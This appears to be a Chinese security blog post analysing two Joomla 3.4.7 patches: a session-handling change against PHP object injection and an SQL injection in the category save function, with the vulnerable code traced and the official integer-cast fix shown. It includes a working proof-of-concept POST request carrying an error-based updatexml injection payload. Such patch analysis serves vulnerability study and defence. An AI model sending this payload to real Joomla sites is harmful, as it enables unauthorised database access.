---
title: Joomla 3.4.7 修复的反序列化与SQL注入
tags:
  - 博客
  - web安全
  - SQL注入
  - 反序列化
order: 10000
---

## 反序列化漏洞修复分析

前一阵子 Joomla 的对象注入很火，而官方3.4.6的修复仅仅是严格过滤了X_FORWARDED_FOR、注释了USER_AGENT存入SESSION那一句，见[这里](https://github.com/joomla/joomla-cms/commit/995db72ff4eaa544e38b4da3630b7a1ac0146264#diff-aba80b5850bf0435954b29dece250cbfL1021),这样只是指哪补哪，治标不治本。看来官方上次的修复只是临时解决方案，这次的更新(3.4.7)算是彻底解决了此问题。

上次的对象注入，需要满足三个条件：

1. 自己实现session的处理方式，重新实现了 session 存储的read()和write()方法，但是并没有对 session 的值进行安全处理。
2. Mysql非strict mode下，使用utf8mb4字符 `\xF0\x9D\x8C\x86` 来截断。
3. PHP <= 5.6.13 session中反序列化解析的BUG。

Joomla 官方也只能解决第一个，也就是改进session的处理方式。这次更新，在 libraries/cms/version/version.php 中，将SESSION存储在内部的Registry类对象中，弃用了以前使用 $_SESSION[$namespace][$name] 的方式：

```php
$this->data = new \Joomla\Registry\Registry;
```

并且，在写SESSION的时候会先做base64_encode：

```php
public function close(){
	if ($this->_state !== 'active'){
		// @TODO :: generated error here
		return false;
	}
	$session = JFactory::getSession();
	$data    = $session->getData();

	// Before storing it, let's serialize and encode the JRegistry object
	$_SESSION['joomla'] = base64_encode(serialize($data));

	session_write_close();
	return true;
}
```

这样，$_SESSION 就只剩下了$_SESSION[‘joomla’]，而且$_SESSION[‘joomla’] 只存储了Registry的对象$data，在执行read()和write()时候，SESSION是经过base64_encode后的数据，就不会存在read()之后自动反序列化而导致对象注入了。

在反序列化的时候也不存在unserialize参数可控的情况。（可控的只是$data的成员变量）

```php
if (isset($_SESSION['joomla']) && !empty($_SESSION['joomla'])){
    $data = $_SESSION['joomla'];
    $data = base64_decode($data);
    $this->data = unserialize($data);
}
```

Joomla官方这次的解决方案比较好，不像上次那样治标不治本，这样的态度值得称赞。反观Apache对struts2 漏洞的修复…就不说了。

## SQL注入漏洞分析

### 漏洞分析

代码位于，administrator/components/com_categories/models/category.php，save()函数内：

```php
$assoc = $this->getAssoc();

if ($assoc)
{
	// Adding self to the association
	$associations = $data['associations'];

	foreach ($associations as $tag => $id)
	{
		if (empty($id))
		{
			unset($associations[$tag]);
		}
	}

	// Detecting all item menus
	$all_language = $table->language == '*';

	if ($all_language && !empty($associations))
	{
		JError::raiseNotice(403, JText::_('COM_CATEGORIES_ERROR_ALL_LANGUAGE_ASSOCIATED'));
	}

	$associations[$table->language] = $table->id;

	// Deleting old association for these items
	$db = $this->getDbo();
	$query = $db->getQuery(true)
		->delete('#__associations')
		->where($db->quoteName('context') . ' = ' . $db->quote($this->associationsContext))
		->where($db->quoteName('id') . ' IN (' . implode(',', $associations) . ')');
	$db->setQuery($query);
	$db->execute();

	if ($error = $db->getErrorMsg())
	{
		$this->setError($error);

		return false;
	}

	if (!$all_language && count($associations))
	{
		// Adding new association for these items
		$key = md5(json_encode($associations));
		$query->clear()
			->insert('#__associations');

		foreach ($associations as $id)
		{
			$query->values($id . ',' . $db->quote($this->associationsContext) . ',' . $db->quote($key));
		}

		$db->setQuery($query);
		$db->execute();

		if ($error = $db->getErrorMsg())
		{
			$this->setError($error);

			return false;
		}
	}
}
```

其中的 $associations 未经过适当处理、我们跟着流程来看看。

首先，`$assoc = $this->getAssoc();` 为 True 的时候整个逻辑才能进来，这个`getAssoc()`是什么呢？跟进getAssoc()的实现(文件的 1234 行)，发现关键是在：

```php
$assoc = JLanguageAssociations::isEnabled();
```

搜索一下，发现 JLanguageAssociations 是 Joomla 的一个多语言插件 [http://www.slideshare.net/erictiggeler/creating-a-multilingual-site-in-joomla-joomla-3-beginners-guide-eric-tiggeler](http://www.slideshare.net/erictiggeler/creating-a-multilingual-site-in-joomla-joomla-3-beginners-guide-eric-tiggeler), 这个插件是 Joomla 自带的，默认没有开启，我们在后台将他开启。

然后，继续看代码，`$associations = $data['associations'];`, $data是post过来的数据，$associations没有经过过滤就传到了：

```php
$query = $db->getQuery(true)
				->delete('#__associations')
				->where($db->quoteName('context') . ' = ' . $db->quote($this->associationsContext))
				->where($db->quoteName('id') . ' IN (' . implode(',', $associations) . ')');
```

导致SQL注入。

那 Joomla 有没有全局过滤呢？我们看看 Joomla 是如何处理POST数据的。

在 libraries/legacy/controller/form.php , save() 函数，

```php
public function save($key = null, $urlVar = null){
    ...
    $data  = $this->input->post->get('jform', array(), 'array');
    ...
    $validData = $model->validate($form, $data);
```

validate() 函数在 libraries/legacy/model/form.php 302行, 他又调用了libraries/joomla/form/form.php 的filter() 函数，具体实现就不继续了，总之这里的POST参数只是处理了 ‘ XSS and specified bad code. ‘。

最后，构造POC。在修改分类，保存的时候，修改POST数据:

```php
POST /Joomla/administrator/index.php?option=com_categories&extension=com_content&layout=edit&id=19

jform[title]=Joomla!&jform[alias]=joomla&jform[description]=&jform[parent_id]=14&jform[published]=1&jform[access]=1&jform[language]=*&jform[note]=&jform[version_note]=&jform[created_time]=2011-01-01+00:00:01&jform[created_user_id]=945&jform[modified_time]=2015-12-23+08:09:46&jform[modified_user_id]=945&jform[hits]=0&jform[id]=19&jform[metadesc]=&jform[metakey]=&jform[metadata][author]=&jform[metadata][robots]=&jform[associations][en-GB]=2) or updatexml(1,concat(0x7e,(version())),0) -- -&jform[rules][core.create][1]=&jform[rules][core.delete][1]=&jform[rules][core.edit][1]=&jform[rules][core.edit.state][1]=&jform[rules][core.edit.own][1]=&jform[rules][core.create][13]=&jform[rules][core.delete][13]=&jform[rules][core.edit][13]=&jform[rules][core.edit.state][13]=&jform[rules][core.edit.own][13]=&jform[rules][core.create][6]=&jform[rules][core.delete][6]=&jform[rules][core.edit][6]=&jform[rules][core.edit.state][6]=&jform[rules][core.edit.own][6]=&jform[rules][core.create][7]=&jform[rules][core.delete][7]=&jform[rules][core.edit][7]=&jform[rules][core.edit.state][7]=&jform[rules][core.edit.own][7]=&jform[rules][core.create][2]=&jform[rules][core.delete][2]=&jform[rules][core.edit][2]=&jform[rules][core.edit.state][2]=&jform[rules][core.edit.own][2]=&jform[rules][core.create][3]=&jform[rules][core.delete][3]=&jform[rules][core.edit][3]=&jform[rules][core.edit.state][3]=&jform[rules][core.edit.own][3]=&jform[rules][core.create][4]=&jform[rules][core.delete][4]=&jform[rules][core.edit][4]=&jform[rules][core.edit.state][4]=&jform[rules][core.edit.own][4]=&jform[rules][core.create][5]=&jform[rules][core.delete][5]=&jform[rules][core.edit][5]=&jform[rules][core.edit.state][5]=&jform[rules][core.edit.own][5]=&jform[rules][core.create][10]=0&jform[rules][core.delete][10]=&jform[rules][core.edit][10]=&jform[rules][core.edit.state][10]=&jform[rules][core.edit.own][10]=&jform[rules][core.create][12]=0&jform[rules][core.delete][12]=&jform[rules][core.edit][12]=&jform[rules][core.edit.state][12]=&jform[rules][core.edit.own][12]=&jform[rules][core.create][8]=&jform[rules][core.delete][8]=&jform[rules][core.edit][8]=&jform[rules][core.edit.state][8]=&jform[rules][core.edit.own][8]=&jform[params][category_layout]=&jform[params][image]=&jform[params][image_alt]=&jform[extension]=com_content&task=category.apply&2ebbc80d46dda42570c1b1699a58323d=1
```

jform[associations][en-GB] 这个参数就是 $associations，成功注入。

![Jommla](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/dWuY7g.jpg)

> 这里打一波广告，我们的Skywolf是可以轻松检测出来的，如下图

![Skywolf](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/vwJyVt.jpg)

另外，`libraries/legacy/model/admin.php` 这里也存在着同样的问题。

### 修复方案

官方增加了：

```php
...
$associations = Joomla\Utilities\ArrayHelper::toInteger($associations);
...
$query->values(((int) $id) . ',' . $db->quote($this->associationsContext) . ',' . $db->quote($key));
...
```

将 $associations 中的所有值转换为int型。还有将 $id 强制转换为int。

## 参考资料

1. [http://drops.wooyun.org/papers/11330](http://drops.wooyun.org/papers/11330)
2. [http://drops.wooyun.org/papers/11371](http://drops.wooyun.org/papers/11371)
3. [http://bobao.360.cn/learning/detail/2501.html](http://bobao.360.cn/learning/detail/2501.html)
4. [https://github.com/joomla/joomla-cms/commit/2cd4ef682f0cab6ff03200b79007a25f19c6690e](https://github.com/joomla/joomla-cms/commit/2cd4ef682f0cab6ff03200b79007a25f19c6690e)
5. [https://www.joomla.org/announcements/release-news/5643-joomla-3-4-7.html](https://www.joomla.org/announcements/release-news/5643-joomla-3-4-7.html)
